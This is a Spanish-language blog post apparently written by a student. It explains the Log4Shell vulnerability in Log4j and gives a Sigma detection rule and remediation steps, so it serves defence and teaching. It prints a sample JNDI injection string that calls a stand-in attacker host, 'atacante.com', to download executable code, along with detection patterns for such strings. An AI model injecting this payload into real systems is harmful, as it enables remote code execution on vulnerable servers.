---
title: "Análisis en Profundidad de Log4Shell (CVE-2021-44228)"
date: "2026-10-02"
author: "Estudiante CiberCelia"
author_github: "cibercelia"
category: "post"
tags: ["cve", "vulnerabilidad", "java", "jndi", "blueteam"]
summary: "Estudio técnico de una de las vulnerabilidades más críticas de la historia reciente: origen JNDI, mecanismo de inyección y contramedidas."
---

# Análisis de la vulnerabilidad Log4Shell (CVE-2021-44228)

En diciembre de 2021 se descubrió una vulnerabilidad de ejecución remota de código (RCE) en la librería de registro **Apache Log4j 2**, bautizada como **Log4Shell**. Con una puntuación CVSS de **10.0 (Crítica)**, afectó a millones de servicios empresariales en todo el mundo.

---

## ¿Por qué ocurrió?

Log4j incluía una funcionalidad de sustitución de mensajes que permitía consultar datos dinámicos mediante **JNDI (Java Naming and Directory Interface)**:

```text
${jndi:ldap://atacante.com/exploit}
```

Cuando Log4j procesaba un mensaje que contenía esta cadena (por ejemplo, en la cabecera `User-Agent` de una petición HTTP), intentaba contactar con el servidor LDAP del atacante y descargar una clase Java ejecutable.

---

## Flujo del Ataque

```
[Atacante] --( Petición HTTP con payload ${jndi:...} )--> [Servidor Vulnerable (Log4j)]
                                                                    |
                                                            (Consulta LDAP JNDI)
                                                                    v
[Servidor LDAP Malicioso] <-----------------------------------------+
       |
  (Envía clase Java maliciosa)
       v
[Servidor Vulnerable] ===> ¡Ejecución remota de código en contexto de aplicación!
```

---

## Detección y Mitigación

### 1. Regla Sigma para detección en logs de proxy o WAF:

```yaml
title: Detección de patrones JNDI en cabeceras HTTP
status: production
logsource:
    category: webserver
detection:
    keywords:
        - '${jndi:ldap:'
        - '${jndi:rmi:'
        - '${jndi:dns:'
    condition: keywords
falsepositives:
    - Escaneos de seguridad autorizados
level: critical
```

### 2. Medidas de remediación inmediatas:
- Actualizar Log4j a versiones `>= 2.17.1`.
- Configurar la propiedad del sistema `log4j2.formatMsgNoLookups=true` en versiones 2.10 a 2.14.1.
- Restringir el tráfico saliente desde servidores de aplicaciones hacia puertos no estándar de LDAP/RMI.
